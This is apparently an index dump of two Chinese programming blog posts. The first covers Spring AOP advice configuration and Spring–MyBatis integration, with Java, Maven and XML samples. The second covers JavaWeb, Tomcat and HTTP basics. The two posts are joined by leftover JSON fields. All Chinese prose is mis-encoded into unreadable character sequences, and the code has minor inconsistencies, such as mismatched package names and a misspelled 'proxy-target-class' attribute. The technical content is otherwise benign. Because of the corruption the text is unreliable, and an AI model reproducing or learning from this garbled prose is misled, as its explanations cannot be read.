SpringAOPä¸­ï¼Œé€šè¿‡Adviceå®šä¹‰æ¨ªåˆ‡é€»è¾‘ï¼ŒSpringä¸­æ”¯æŒ5ç§ç±»å‹çš„Advice: å³ Aop åœ¨ ä¸æ”¹å˜åŸæœ‰ä»£ç çš„æƒ…å†µä¸‹ , å»å¢åŠ æ–°çš„åŠŸèƒ½ . é€šè¿‡ Spring API å®ç°ã€é‡ç‚¹ã€‘ä½¿ç”¨AOPç»‡å…¥ï¼Œéœ€è¦å¯¼å…¥ä¸€ä¸ªä¾èµ–åŒ…ï¼ 123456&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; ç¬¬ä¸€ç§æ–¹å¼ é€šè¿‡ Spring API å®ç° é¦–å…ˆç¼–å†™æˆ‘ä»¬çš„ä¸šåŠ¡æ¥å£å’Œå®ç°ç±» 123456public interface UserService &#123; public void add(); public void delete(); public void update(); public void search();&#125; 123456789101112131415161718public class UserServiceImpl implements UserService&#123; @Override public void add() &#123; System.out.println(&quot;å¢åŠ ç”¨æˆ·&quot;); &#125; @Override public void delete() &#123; System.out.println(&quot;åˆ é™¤ç”¨æˆ·&quot;); &#125; @Override public void update() &#123; System.out.println(&quot;æ›´æ–°ç”¨æˆ·&quot;); &#125; @Override public void search() &#123; System.out.println(&quot;æŸ¥è¯¢ç”¨æˆ·&quot;); &#125;&#125; ç„¶åå»å†™æˆ‘ä»¬çš„å¢å¼ºç±» , æˆ‘ä»¬ç¼–å†™ä¸¤ä¸ª , ä¸€ä¸ªå‰ç½®å¢å¼º ä¸€ä¸ªåç½®å¢å¼º 123456789public class Log implements MethodBeforeAdvice &#123; //method : è¦æ‰§è¡Œçš„ç›®æ ‡å¯¹è±¡çš„æ–¹æ³• //objects : è¢«è°ƒç”¨çš„æ–¹æ³•çš„å‚æ•° //Object : ç›®æ ‡å¯¹è±¡ @Override public void before(Method method, Object[] objects, Object o) throws Throwable &#123; System.out.println( o.getClass().getName() + &quot;çš„&quot; + method.getName() + &quot;æ–¹æ³•è¢«æ‰§è¡Œäº†&quot;); &#125;&#125; 123456789101112public class AfterLog implements AfterReturningAdvice &#123; //returnValue è¿”å›å€¼ //methodè¢«è°ƒç”¨çš„æ–¹æ³• //args è¢«è°ƒç”¨çš„æ–¹æ³•çš„å¯¹è±¡çš„å‚æ•° //target è¢«è°ƒç”¨çš„ç›®æ ‡å¯¹è±¡ @Override public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable &#123; System.out.println(&quot;æ‰§è¡Œäº†&quot; + target.getClass().getName() +&quot;çš„&quot;+method.getName()+&quot;æ–¹æ³•,&quot; +&quot;è¿”å›å€¼ï¼š&quot;+returnValue); &#125;&#125; æœ€åå»springçš„æ–‡ä»¶ä¸­æ³¨å†Œ , å¹¶å®ç°aopåˆ‡å…¥å®ç° , æ³¨æ„å¯¼å…¥çº¦æŸ . 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&gt; &lt;!--æ³¨å†Œbean--&gt; &lt;bean id=&quot;userService&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;/&gt; &lt;bean id=&quot;log&quot; class=&quot;com.she11F.log.Log&quot;/&gt; &lt;bean id=&quot;afterLog&quot; class=&quot;com.she11F.log.AfterLog&quot;/&gt; &lt;!--aopçš„é…ç½®--&gt; &lt;aop:config&gt; &lt;!--åˆ‡å…¥ç‚¹ expression:è¡¨è¾¾å¼åŒ¹é…è¦æ‰§è¡Œçš„æ–¹æ³•--&gt; &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;/&gt; &lt;!--æ‰§è¡Œç¯ç»•; advice-refæ‰§è¡Œæ–¹æ³• . pointcut-refåˆ‡å…¥ç‚¹--&gt; &lt;aop:advisor advice-ref=&quot;log&quot; pointcut-ref=&quot;pointcut&quot;/&gt; &lt;aop:advisor advice-ref=&quot;afterLog&quot; pointcut-ref=&quot;pointcut&quot;/&gt; &lt;/aop:config&gt;&lt;/beans&gt; ç¬¬äºŒç§æ–¹å¼ è‡ªå®šä¹‰ç±»æ¥å®ç°Aop ç›®æ ‡ä¸šåŠ¡ç±»ä¸å˜ä¾æ—§æ˜¯userServiceImpl ç¬¬ä¸€æ­¥ : å†™æˆ‘ä»¬è‡ªå·±çš„ä¸€ä¸ªåˆ‡å…¥ç±» 12345678public class DiyPointcut &#123; public void before()&#123; System.out.println(&quot;---------æ–¹æ³•æ‰§è¡Œå‰---------&quot;); &#125; public void after()&#123; System.out.println(&quot;---------æ–¹æ³•æ‰§è¡Œå---------&quot;); &#125;&#125; å»springä¸­é…ç½® 12345678910111213&lt;!--ç¬¬äºŒç§æ–¹å¼è‡ªå®šä¹‰å®ç°--&gt;&lt;!--æ³¨å†Œbean--&gt;&lt;bean id=&quot;diy&quot; class=&quot;com.she11F.diy.DiyPointcut&quot;/&gt;&lt;bean id=&quot;userService&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;/&gt;&lt;!--aopçš„é…ç½®--&gt;&lt;aop:config&gt; &lt;!--ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨AOPçš„æ ‡ç­¾å®ç°--&gt; &lt;aop:aspect ref=&quot;diy&quot;&gt; &lt;aop:pointcut id=&quot;diyPonitcut&quot; expression=&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;/&gt; &lt;aop:before pointcut-ref=&quot;diyPonitcut&quot; method=&quot;before&quot;/&gt; &lt;aop:after pointcut-ref=&quot;diyPonitcut&quot; method=&quot;after&quot;/&gt; &lt;/aop:aspect&gt;&lt;/aop:config&gt; ç¬¬ä¸‰ç§æ–¹å¼ ä½¿ç”¨æ³¨è§£å®ç° ç¬¬ä¸€æ­¥ï¼šç¼–å†™ä¸€ä¸ªæ³¨è§£å®ç°çš„å¢å¼ºç±» 12345678910111213141516171819202122232425262728package com.she11F.diy;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.After;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;@Aspectpublic class AnnotationPointcut &#123; @Before(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void before()&#123; System.out.println(&quot;---------æ–¹æ³•æ‰§è¡Œå‰---------&quot;); &#125; @After(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void after()&#123; System.out.println(&quot;---------æ–¹æ³•æ‰§è¡Œå---------&quot;); &#125; @Around(&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;) public void around(ProceedingJoinPoint jp) throws Throwable &#123; System.out.println(&quot;ç¯ç»•å‰&quot;); System.out.println(&quot;ç­¾å:&quot;+jp.getSignature()); //æ‰§è¡Œç›®æ ‡æ–¹æ³•proceed Object proceed = jp.proceed(); System.out.println(&quot;ç¯ç»•å&quot;); System.out.println(proceed); &#125;&#125; ç¬¬äºŒæ­¥ï¼šåœ¨Springé…ç½®æ–‡ä»¶ä¸­ï¼Œæ³¨å†Œbeanï¼Œå¹¶å¢åŠ æ”¯æŒæ³¨è§£çš„é…ç½® 123&lt;!--ç¬¬ä¸‰ç§æ–¹å¼:æ³¨è§£å®ç°--&gt;&lt;bean id=&quot;annotationPointcut&quot; class=&quot;com.kuang.config.AnnotationPointcut&quot;/&gt;&lt;aop:aspectj-autoproxy/&gt; aop:aspectj-autoproxyï¼šè¯´æ˜ 1é€šè¿‡aopå‘½åç©ºé—´çš„&lt;aop:aspectj-autoproxy /&gt;å£°æ˜è‡ªåŠ¨ä¸ºspringå®¹å™¨ä¸­é‚£äº›é…ç½®@aspectJåˆ‡é¢çš„beanåˆ›å»ºä»£ç†ï¼Œç»‡å…¥åˆ‡é¢ã€‚å½“ç„¶ï¼Œspring åœ¨å†…éƒ¨ä¾æ—§é‡‡ç”¨AnnotationAwareAspectJAutoProxyCreatorè¿›è¡Œè‡ªåŠ¨ä»£ç†çš„åˆ›å»ºå·¥ä½œï¼Œä½†å…·ä½“å®ç°çš„ç»†èŠ‚å·²ç»è¢«&lt;aop:aspectj-autoproxy /&gt;éšè—èµ·æ¥äº† &lt;aop:aspectj-autoproxy /&gt;æœ‰ä¸€ä¸ªproxy-target-classå±æ€§ï¼Œé»˜è®¤ä¸ºfalseï¼Œè¡¨ç¤ºä½¿ç”¨jdkåŠ¨æ€ä»£ç†ç»‡å…¥å¢å¼ºï¼Œå½“é…ä¸º&lt;aop:aspectj-autoproxy poxy-target-class=&quot;true&quot;/&gt;æ—¶ï¼Œè¡¨ç¤ºä½¿ç”¨CGLibåŠ¨æ€ä»£ç†æŠ€æœ¯ç»‡å…¥å¢å¼ºã€‚ä¸è¿‡å³ä½¿proxy-target-classè®¾ç½®ä¸ºfalseï¼Œå¦‚æœç›®æ ‡ç±»æ²¡æœ‰å£°æ˜æ¥å£ï¼Œåˆ™springå°†è‡ªåŠ¨ä½¿ç”¨CGLibåŠ¨æ€ä»£ç†ã€‚ æ•´åˆMybatisæ­¥éª¤ï¼š å¯¼å…¥ç›¸å…³jaråŒ… junit 12345&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt;&lt;/dependency&gt; mybatis 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt; mysqlæ•°æ®åº“ 12345&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt;&lt;/dependency&gt; springç›¸å…³ 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.1.10.RELEASE&lt;/version&gt;&lt;/dependency&gt; aopç»‡å…¥å™¨ 123456&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; mybatis-springæ•´åˆåŒ…ã€é‡ç‚¹ã€‘åœ¨æ­¤è¿˜å¯¼å…¥äº†lombokåŒ…ã€‚ 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt;&lt;/dependency&gt; é…ç½®Mavené™æ€èµ„æºè¿‡æ»¤é—®é¢˜ï¼ 123456789101112&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; ç¼–å†™é…ç½®æ–‡ä»¶ æµ‹è¯• å›å¿†MyBatisé…ç½® pojo 12345public class User &#123; private int id; //id private String name; //å§“å private String pwd; //å¯†ç &#125; å®ç°mybatisçš„é…ç½®æ–‡ä»¶ 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;typeAliases&gt; &lt;package name=&quot;com.she11F.pojo&quot;/&gt; &lt;/typeAliases&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/test?useSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;package name=&quot;com.she11F.dao&quot;/&gt; &lt;/mappers&gt;&lt;/configuration&gt; ç¼–å†™UserMapperæ¥å£ 123public interface UserMapper &#123; public List&lt;User&gt; selectUser();&#125; ç¼–å†™UserMapper.xmlæ–‡ä»¶ 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.kuang.mapper.UserMapper&quot;&gt; &lt;!--sql--&gt; &lt;select id=&quot;selectUser&quot; resultType=&quot;user&quot;&gt; select * from mybatis.user &lt;/select&gt;&lt;/mapper&gt; æµ‹è¯•ç±» 12345678910111213@Testpublic void selectUser() throws IOException &#123; String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession sqlSession = sqlSessionFactory.openSession(); UserMapper mapper = sqlSession.getMapper(UserMapper.class); List&lt;User&gt; userList = mapper.selectUser(); for (User user: userList)&#123; System.out.println(user); &#125; sqlSession.close();&#125; å…ˆå†™åˆ°è¿™é‡Œå§ï¼Œå…ˆå»çœ‹ SpringMVC ï¼ŒSpring æ•´åˆ MyBatis ä¹‹åé‡æ–°åˆ›å»ºä¸€ä¸ªé¡¹ç›®æ¥çœ‹","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"JavaWeb å­¦ä¹ ","path":"/2024/09/05/java/å¼€å‘/JavaWeb/","content":"è¡¥ä¸€è¡¥åŸºç¡€ 0x01 åŸºæœ¬æ¦‚å¿µ1.1 å‰è¨€é™æ€Webï¼š æä¾›ç»™æ‰€æœ‰äººçœ‹æ•°æ®ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼ HTMLï¼ŒCSS åŠ¨æ€Webï¼š æœ‰æ•°æ®äº¤äº’ï¼Œç™»å½•è´¦å·å¯†ç ï¼Œç½‘ç«™è®¿é—®äººæ•°ç­‰ æŠ€æœ¯æ ˆï¼šServlet&#x2F;JSPï¼ŒASPï¼ŒPHP åœ¨Javaä¸­ï¼ŒåŠ¨æ€webèµ„æºå¼€å‘çš„æŠ€æœ¯ç»Ÿç§°ä¸ºJavaWebï¼›s 1.2 Web åº”ç”¨ç¨‹åºWeb åº”ç”¨ç¨‹åºï¼šå¯ä»¥æä¾›æµè§ˆå™¨è®¿é—®çš„ç¨‹åºï¼› è¿™ä¸ªç»Ÿä¸€çš„webèµ„æºä¼šè¢«æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼ŒWeb åº”ç”¨ç¨‹åº â€”&gt; Tomcatï¼šæœåŠ¡å™¨ä¸€ä¸ª Web åº”ç”¨ç”±å¤šéƒ¨åˆ†ç»„æˆï¼ˆé™æ€Webã€åŠ¨æ€Webï¼‰ HTMLï¼ŒCSSï¼ŒJavaScript JSPï¼ŒServlet Java ç¨‹åº jar åŒ… é…ç½®æ–‡ä»¶ ï¼ˆPropertiesï¼‰ Web åº”ç”¨ç¨‹åºç¼–å†™å®Œæ¯•åï¼Œè‹¥æƒ³æä¾›ç»™å¤–ç•Œè®¿é—®ï¼šéœ€è¦ä¸€ä¸ªæœåŠ¡å™¨æ¥ç»Ÿä¸€ç®¡ç†ï¼› 1.3 åŠ¨æ€ Web çš„è®¿é—®è¿‡ç¨‹æµè§ˆå™¨å‘é€ HTTP è¯·æ±‚ï¼ŒæœåŠ¡å™¨ Tomcat æ¥æ”¶è¯·æ±‚ï¼ŒServlet å®¹å™¨ä»ç£ç›˜åŠ è½½ Servlet ç¨‹åºå¤„ç†è¯·æ±‚ request ï¼Œå¤„ç†ç»“æŸè¿”å› responseã€‚ 0x02 webæœåŠ¡å™¨2.1 æŠ€æœ¯è®²è§£ASP: å¾®è½¯ï¼šå›½å†…æœ€æ—©æµè¡Œçš„å°±æ˜¯ASPï¼› åœ¨HTMLä¸­åµŒå…¥äº†VBçš„è„šæœ¬ï¼ŒASP+COMï¼› åœ¨ASPå¼€å‘ä¸­ï¼ŒåŸºæœ¬ä¸€ä¸ªé¡µé¢éƒ½æœ‰å‡ åƒè¡Œçš„ä¸šåŠ¡ä»£ç ï¼Œé¡µé¢æå…¶æ··ä¹± ç»´æŠ¤æˆæœ¬é«˜ï¼ C# IIS php: PHPå¼€å‘é€Ÿåº¦å¾ˆå¿«ï¼ŒåŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œè·¨å¹³å°ï¼Œä»£ç å¾ˆç®€å•ï¼ˆ70%ï¼ŒWPï¼‰ æ— æ³•æ‰¿è½½å¤§è®¿é—®é‡çš„æƒ…å†µï¼ˆå±€é™æ€§ï¼‰ JSP&#x2F;Servlet: B&#x2F;Sï¼›æµè§ˆå’ŒæœåŠ¡å™¨C&#x2F;Sï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ sunå…¬å¸ä¸»æ¨çš„B&#x2F;Sæ¶æ„ åŸºäºJavaè¯­è¨€çš„ï¼ˆæ‰€æœ‰çš„å¤§å…¬å¸ï¼Œæˆ–è€…ä¸€äº›å¼€æºçš„ç»„ä»¶ï¼Œéƒ½æ˜¯ç”¨Javaå†™çš„ï¼‰ å¯ä»¥æ‰¿è½½ä¸‰é«˜é—®é¢˜å¸¦æ¥çš„å½±å“ï¼› è¯­æ³•åƒASPï¼ŒASP-&gt;JSPï¼ŒåŠ å¼ºå¸‚åœºå¼ºåº¦ 2.2 webæœåŠ¡å™¨æœåŠ¡å™¨æ˜¯ä¸€ç§è¢«åŠ¨çš„æ“ä½œï¼Œç”¨æ¥å¤„ç†ç”¨æˆ·çš„ä¸€äº›è¯·æ±‚å’Œç»™ç”¨æˆ·ä¸€äº›å“åº”ä¿¡æ¯ï¼›lISå¾®è½¯çš„ï¼›ASPï¼ŒWindowsä¸­è‡ªå¸¦çš„Tomcat é¢å‘ç™¾åº¦ç¼–ç¨‹ï¼šTomcatæ˜¯Apache è½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundation)çš„jakartaé¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œæœ€æ–°çš„Servlet å’ŒJSP è§„èŒƒæ€»æ˜¯èƒ½åœ¨Tomcatä¸­å¾—åˆ°ä½“ç°ï¼Œå› ä¸ºTomcat æŠ€æœ¯å…ˆè¿›ã€æ€§èƒ½ç¨³å®šï¼Œè€Œä¸”å…è´¹ï¼Œå› è€Œæ·±å—lavaçˆ±å¥½è€…çš„å–œçˆ±å¹¶å¾—åˆ°äº†éƒ¨åˆ†è½¯ä»¶å¼€å‘å•†çš„è®¤å¯ï¼Œæˆä¸ºç›®å‰æ¯”è¾ƒæµè¡Œçš„Webåº”ç”¨æœåŠ¡å™¨ã€‚ Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Webåº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ï¼Œæ˜¯å¼€å‘å’Œè°ƒè¯•JSPç¨‹åºçš„é¦–é€‰ã€‚å¯¹äºä¸€ä¸ªJavaåˆå­¦webçš„äººæ¥è¯´ï¼Œå®ƒæ˜¯æœ€ä½³çš„é€‰æ‹© Tomcat å®é™…ä¸Šè¿è¡ŒJSPé¡µé¢å’ŒServletã€‚Tornctæœ€æ–°ç‰ˆæ˜“9.0 å·¥ä½œ3-5å¹´ä¹‹åï¼Œå¯ä»¥å°è¯•æ‰‹å†™TomcatæœåŠ¡å™¨ï¼› 0x03 Tomcat3.1 å®‰è£… TomcatTomcatå®˜ç½‘ï¼šhttp://tomcat.apache.org/ 3.2 Tomcat å¯åŠ¨å’Œé…ç½®æ–‡ä»¶å¤¹ï¼š å¯åŠ¨å’Œå…³é—­ Tomcatï¼š è®¿é—®æµ‹è¯•ï¼šhttp://localhost:8080/ å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼š 121.Java ç¯å¢ƒå˜é‡æ²¡æœ‰é…ç½®å¯¼è‡´é—ªé€€2.ä¹±ç é—®é¢˜ï¼šå¯åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½® 3.3 é…ç½®Servlet æ ¸å¿ƒé…ç½®æ–‡ä»¶ç›®å½•å¦‚ä¸‹ï¼š å¯ä»¥é…ç½®å¯åŠ¨çš„ç«¯å£å· tomcatçš„é»˜è®¤ç«¯å£å·ä¸ºï¼š8080 mysqlï¼š3306 httpï¼š80 httpsï¼š443 1234&lt;Connector port=&quot;8081&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt;å¯é…ç½®ä¸»æœºåç§° é»˜è®¤çš„ä¸»æœºåä¸ºï¼šlocalhost-&gt;127.0.0.1 é»˜è®¤ç½‘ç«™åº”ç”¨å­˜æ”¾çš„ä½ç½®ä¸ºï¼šwebapps 12&lt;Host name=&quot;www.qinjiang.com&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; é¢è¯•é¢˜ï¼š åœ¨æµè§ˆå™¨è¾“å…¥ä¸€ä¸ªåŸŸåï¼Œå›è½¦ï¼› æœ¬æœºæŸ¥çœ‹ C:\\Windows\\System32\\drivers\\etc\\hosts é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰ç›¸åº”åŸŸåçš„æ˜ å°„ã€‚ â€‹\tcase1: è‹¥æœ‰ï¼Œåˆ™ç›´æ¥æ˜ å°„åˆ°å¯¹åº”çš„ IP åœ°å€ï¼Œè¿›è¡Œè®¿é—®ã€‚ â€‹\tcase2: è‹¥æ— ï¼Œåˆ™å» DNS æœåŠ¡å™¨ä¸ŠæŸ¥æ‰¾å¯¹åº”çš„ IP ï¼Œæ‰¾åˆ°å°±è¿”å›ç›¸åº”çš„ IPï¼Œæ‰¾ä¸åˆ°å°±ä¸è¿”å›ã€‚ 3.4 å‘å¸ƒä¸€ä¸ª Web ç½‘ç«™ç½‘ç«™ç¨‹åºçš„ç»“æ„ï¼š 1234567891011121314--webapps ï¼šTomcatæœåŠ¡å™¨çš„webç›®å½•\t-ROOT\t-kuangstudy ï¼šç½‘ç«™çš„ç›®å½•å - WEB-INF -classes : javaç¨‹åº -libï¼šwebåº”ç”¨æ‰€ä¾èµ–çš„jaråŒ… -web.xml ï¼šç½‘ç«™é…ç½®æ–‡ä»¶ - index.html é»˜è®¤çš„é¦–é¡µ - static -css -style.css -js -img -..... 0x04 HTTP4.1 ä»€ä¹ˆæ˜¯ HTTP?HTTP(hypertext transport protocol) è¶…æ–‡æœ¬ä¼ è¾“åè®®ã€‚ æ–‡æœ¬ ï¼šHTMLï¼Œå­—ç¬¦ä¸²â€¦ è¶…æ–‡æœ¬ï¼šå›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘ï¼Œå®šä½ï¼Œåœ°å›¾â€¦ 80 ç«¯å£ HTTPSï¼ˆHyper Text Transfer Protocol over SecureSocket Layerï¼‰ï¼šæ˜¯ä»¥å®‰å…¨ä¸ºç›®æ ‡çš„ HTTP é€šé“ï¼Œåœ¨ HTTP çš„åŸºç¡€ä¸Šé€šè¿‡ä¼ è¾“åŠ å¯†å’Œèº«ä»½è®¤è¯ä¿è¯äº†ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨æ€§ã€‚HTTPS åœ¨HTTP çš„åŸºç¡€ä¸‹åŠ å…¥SSL å±‚ï¼ŒHTTPS çš„å®‰å…¨åŸºç¡€æ˜¯ SSLã€‚ 443 ç«¯å£ 4.2 ä¸¤ä¸ªæ—¶ä»£HTTP 1.0: HTTP&#x2F;1.0ï¼šå®¢æˆ·ç«¯ä¸ Web æœåŠ¡å™¨è¿æ¥åï¼Œåªèƒ½è·å¾—ä¸€ä¸ªWen èµ„æºï¼Œç„¶åå°±æ–­å¼€è¿æ¥ï¼ŒåŠ å…¥æŸä¸ªé¡µé¢æœ‰å¤šä¸ªå›¾ç‰‡èµ„æºéœ€è¦åŠ è½½ï¼Œé‚£ä¹ˆéœ€è¦è¿æ¥å¤šæ¬¡ï¼Œå½±å“æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„æ€§èƒ½ã€‚ HTTP 2.0: HTTP&#x2F;1.1ï¼šå®¢æˆ·ç«¯å¯ä»¥ä¸webæœåŠ¡å™¨è¿æ¥åï¼Œå¯ä»¥è·å¾—å¤šä¸ªwebèµ„æºã€‚ HTTP 1.0å’ŒHTTP 1.1çš„ä¸»è¦åŒºåˆ«-CSDNåšå®¢ 4.3 HTTP è¯·æ±‚å®¢æˆ·ç«¯ -&gt; å‘é€è¯·æ±‚ï¼ˆRequestï¼‰-&gt;æœåŠ¡å™¨ ç™¾åº¦ï¼š 1234Request URL:https://www.baidu.com/ è¯·æ±‚åœ°å€Request Method:GET getæ–¹æ³•/postæ–¹æ³•Status Code:200 OK çŠ¶æ€ç ï¼š200Remoteï¼ˆè¿œç¨‹ï¼‰ Address:14.215.177.39:443 12345Accept:text/html Accept-Encoding:gzip, deflate, brAccept-Language:zh-CN,zh;q=0.9 è¯­è¨€Cache-Control:max-age=0Connection:keep-alive 1ã€è¯·æ±‚è¡Œ è¯·æ±‚è¡Œä¸­çš„è¯·æ±‚æ–¹å¼ï¼šGET è¯·æ±‚æ–¹å¼ï¼šGetï¼ŒPostï¼ŒHEAD,DELETE,PUT,TRACTâ€¦ getï¼šè¯·æ±‚èƒ½å¤Ÿæºå¸¦çš„å‚æ•°æ¯”è¾ƒå°‘ï¼Œå¤§å°æœ‰é™åˆ¶ï¼Œä¼šåœ¨æµè§ˆå™¨çš„URLåœ°å€æ æ˜¾ç¤ºæ•°æ®å†…å®¹ï¼Œä¸å®‰å…¨ï¼Œä½†é«˜æ•ˆ postï¼šè¯·æ±‚èƒ½å¤Ÿæºå¸¦çš„å‚æ•°æ²¡æœ‰é™åˆ¶ï¼Œå¤§å°æ²¡æœ‰é™åˆ¶ï¼Œä¸ä¼šåœ¨æµè§ˆå™¨çš„URLåœ°å€æ æ˜¾ç¤ºæ•°æ®å†…å®¹ï¼Œå®‰å…¨ï¼Œä½†ä¸é«˜æ•ˆã€‚ 2ã€æ¶ˆæ¯å¤´ 123456Acceptï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œå®ƒæ‰€æ”¯æŒçš„æ•°æ®ç±»å‹Accept-Encodingï¼šæ”¯æŒå“ªç§ç¼–ç æ ¼å¼ GBK UTF-8 GB2312 ISO8859-1Accept-Languageï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œå®ƒçš„è¯­è¨€ç¯å¢ƒCache-Controlï¼šç¼“å­˜æ§åˆ¶Connectionï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œè¯·æ±‚å®Œæˆæ˜¯æ–­å¼€è¿˜æ˜¯ä¿æŒè¿æ¥HOSTï¼šä¸»æœº..../. 4.4 HTTP å“åº”æœåŠ¡å™¨ -&gt; å“åº”ï¼ˆresponseï¼‰ -&gt;å®¢æˆ·ç«¯ ç™¾åº¦ï¼š 1234Cache-Control:private ç¼“å­˜æ§åˆ¶Connection:Keep-Alive è¿æ¥Content-Encoding:gzip ç¼–ç Content-Type:text/html ç±»å‹ 1ã€å“åº”ä½“ 12345678Acceptï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œå®ƒæ‰€æ”¯æŒçš„æ•°æ®ç±»å‹Accept-Encodingï¼šæ”¯æŒå“ªç§ç¼–ç æ ¼å¼ GBK UTF-8 GB2312 